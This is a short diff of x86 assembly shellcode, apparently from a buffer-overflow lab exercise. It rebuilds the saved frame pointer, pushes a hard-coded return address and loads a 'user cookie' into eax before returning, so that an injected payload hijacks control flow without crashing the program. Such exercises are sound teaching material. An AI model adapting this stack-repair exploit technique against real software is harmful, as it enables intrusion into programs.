@@ -1,5 +1,6 @@
-movl $0x7cee92d1,%eax
-movl $0x55683510,%ebp
-movl $0x08048dc1,0x556834e4
-movl $0x556834e4,%esp
+leal 0x28(%esp),%eax         # get old ebp
+movl %eax,%ebp               # restoret the old ebp
+subl $0x4,%esp
+movl $0x8048dc1,(%esp)
+movl $0x7cee92d1,%eax        # set user cookie id
 ret
